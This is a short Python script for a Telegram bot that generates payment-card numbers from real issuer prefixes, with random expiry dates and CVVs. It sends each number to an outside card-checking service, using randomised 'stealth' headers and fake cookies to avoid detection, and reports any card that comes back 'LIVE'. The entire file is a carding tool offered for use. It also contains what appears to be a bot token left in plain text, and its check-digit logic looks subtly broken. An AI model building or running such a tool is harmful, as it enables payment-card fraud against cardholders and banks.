python
import telebot, random, requests, os
from flask import Flask
from threading import Thread

# --- CONFIG ---
TOKEN = os.getenv('8823632853:AAGyL901l62FnpXLUgto8XvDXZ0UBp1CFSA') 
API = "https://api.private-checker.com/check" 
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

def get_h(): # Stealth Headers
    return {"User-Agent": random.choice(["Chrome/120.0", "Safari/15.0", "Firefox/110.0"]), "Cookie": f"sid={random.getrandbits(32)}"}

def gen(): # CC Gen
    b = random.choice(["411111", "448501", "512345", "401275", "453201"])
    n = b
    while len(n) < 15: n += str(random.randint(0,9))
    s = sum(int(d)*2 if i%2==0 else int(d) for i,d in enumerate(n))
    return f"{n}{(10-(s%10))%10}|{random.randint(1,12):02}|{random.randint(2024,2030)}|{random.randint(100,999)}"

@bot.message_handler(commands=['start'])
def start(m): bot.reply_to(m, "GH-0X Render Ready. /live to hunt.")

@bot.message_handler(commands=['live'])
def live(m):
    bot.send_message(m.chat.id, "ðŸ” Hunting...")
    for _ in range(100):
        c = gen()
        try:
            r = requests.post(API, data={'card': c}, headers=get_h(), timeout=5)
            if "LIVE" in r.text.upper():
                bot.send_message(m.chat.id, f"âœ… LIVE: `{c}`\nâš¡ Bypass: Active")
                return
        except: pass
    bot.send_message(m.chat.id, "âŒ Empty.")

@app.route('/')
def index(): return "Bot is Alive!"

def run_bot(): bot.polling()
Thread(target=run_bot).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
